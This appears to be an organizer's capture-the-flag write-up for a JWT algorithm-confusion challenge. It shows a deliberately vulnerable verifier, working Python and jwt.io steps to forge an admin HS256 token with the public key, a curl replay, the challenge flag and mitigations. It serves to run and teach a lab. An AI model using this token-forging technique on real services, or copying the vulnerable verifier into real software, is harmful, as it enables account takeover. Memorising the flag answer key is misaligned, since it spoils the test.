# WRITEUP — SOAP Company Token Queue

> **Organizer only.** Do not ship to players. Delete or move out of the
> repo before each event.

## Summary

The `/profile` endpoint verifies JWTs by trusting the `alg` header from
the token itself. When `alg=HS256`, it uses the RSA **public** key PEM
as the HMAC secret. An attacker who holds the public key (it is served
on the profile page and distributed as a download) can mint a
forged `HS256` token with `role=admin` and walk right in.

This is the classic **JWT algorithm confusion** vulnerability
(CVE-2015-9235-class), adapted from the original RS256→HS256 confusion
that bit `node-jsonwebtoken` a decade ago.

## Vulnerability location

`utils/auth.py::verify_token`

```python
def verify_token(token: str):
    ...
    alg = header.get("alg")
    if alg == ALG_RS256:
        payload = jwt.decode(token, PUBLIC_KEY, algorithms=[ALG_RS256])
        ...
    if alg == ALG_HS256:
        # Vulnerable branch: treat PEM as HMAC secret.
        return _verify_hs256_manually(token, PUBLIC_KEY)
```

The verifier reads `alg` from the token's own header, then maps it to
a key. RS256 keys and HS256 secrets are fundamentally different types
(asymmetric vs symmetric), and the code reuses the same PEM bytes for
both. A token can be re-signed under HS256 using the public key bytes
as the HMAC secret, and the verifier will accept it.

The hand-rolled `_verify_hs256_manually` exists only because modern
PyJWT refuses to combine `algorithms=['HS256']` with a PEM-formatted
key — see "Why the manual verifier" below. The vulnerable *logic* is
still the application code's decision to trust `alg` and re-use the
public key for both algorithms.

## Exploitation

### Step 1 — Get a legitimate token

Visit `/queue`. The server mints a JWT and stores it in the
`soap_token` HttpOnly cookie:

```
soap_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOi...
```

You can also extract it by inspecting the `Set-Cookie` header on
`GET /queue`.

### Step 2 — Decode the token

Use any JWT decoder. The token has three parts:

```
header.payload.signature
```

Base64url-decode them:

Header:
```json
{"alg":"RS256","typ":"JWT"}
```

Payload:
```json
{"sub":"SOAP-150652","role":"user","queue":"SOAP-150652",
 "iat":1763000000,"exp":1763003600}
```

Note `alg=RS256`, `role=user`.

### Step 3 — Obtain the public key

Two ways:

- Download `public.pem` (organizers ship it to players, as the file
  must be distributed for the challenge to be solvable).
- Or, on a logged-in session, the profile page exposes the `sub`
  and `queue` fields, but the public key itself must be fetched
  separately. In this challenge, it ships in the player bundle.

### Step 4 — Forge an admin token

Build a new token by hand. The header gets `alg=HS256`. The payload
gets `role=admin` (and `sub=admin` for cosmetic reasons). The
signature is HMAC-SHA256 over `header.payload` using the **entire
`public.pem` file contents** (including `-----BEGIN`/`-----END`
lines) as the secret.

#### Python (manual, no PyJWT)

```python
import base64, hmac, hashlib, json

PUB = open("public.pem", "rb").read()

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

header  = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",",":")).encode())
payload = b64u(json.dumps({
    "sub":"admin", "role":"admin", "queue":"SOAP-999999",
    "iat":0, "exp":9999999999,
}, separators=(",",":")).encode())
signing_input = f"{header}.{payload}".encode()
sig = hmac.new(PUB, signing_input, hashlib.sha256).digest()
forged = f"{header}.{payload}.{b64u(sig)}"
print(forged)
```

#### Python (PyJWT 2.6.0 or earlier)

Older PyJWT (< 2.4.0) does not reject PEM-as-HMAC on encode:

```python
import jwt
pub = open("public.pem").read()
payload = {"sub":"admin","role":"admin","queue":"SOAP-999999",
           "iat":0,"exp":9999999999}
token = jwt.encode(payload, pub, algorithm="HS256")
print(token)
```

#### jwt.io

1. Open https://jwt.io
2. Set Algorithm to `HS256`
3. Paste the entire `public.pem` (with `-----BEGIN`/`-----END` lines)
   into the "Verify Signature" secret box
4. Edit the payload to `"sub":"admin"`, `"role":"admin"`
5. Copy the resulting encoded token

### Step 5 — Use the forged token

Set it as the `soap_token` cookie and visit `/profile`:

```bash
curl -b "soap_token=<forged>" http://localhost:5000/profile
```

Or in a browser: dev tools → Application → Cookies → edit
`soap_token` to the forged value, then load `/profile`.

The admin profile renders the flag in the "Restricted token" block.

### Step 6 — Read the flag

`HTB{jwt_alg_confusion_123}` (or whatever the organizer set in
`flag.txt`).

## Mitigation

The fix is to pin the algorithm on the verify side. Never trust the
`alg` header:

```python
# Safe: hard-code RS256 and the public key.
payload = jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"])
```

Additional defenses:

- Use a library that does this for you (PyJWT >= 2.4.0 with
  `algorithms=[...]` set, `python-jose` with `verify_signature=True`
  pinned to a single algorithm, Authlib with explicit algorithm
  allowlist).
- Keep the public key and HMAC secret in separate key stores so a
  leak of one cannot be cross-used.
- Use a key ID (`kid`) header tied to a known key type so an HS256
  request cannot resolve to an RSA verification key.

## Why the manual verifier

PyJWT 2.4.0 added a safety check that refuses `algorithms=['HS256']`
when the key is PEM-formatted (it raises `InvalidKeyError: The
specified key is an asymmetric key...`). That is a defense in depth
for this class of bug in *application code*, but it does not apply
to the player side — players can sign HS256 tokens however they like
(`hmac` module, jwt.io, older PyJWT, hashcat, etc.).

The application's verifier had to be hand-rolled (`_verify_hs256_manually`)
to preserve the original vulnerable behavior for the challenge. In a
real system you would *not* write this code; you would use the
library's safe defaults.

## Why this is a fair challenge

- The public key is part of the standard JWT trust model — players
  *must* receive it. The challenge tests whether the verifier
  correctly distinguishes symmetric and asymmetric key material.
- The application exposes everything needed to exploit (queue flow
  to obtain a real token, profile page rendering user info that
  hints at the JWT contents).
- The intended path is short: decode, swap, sign, replay. Players
  who reach for `jwt.io` can solve it in five minutes.
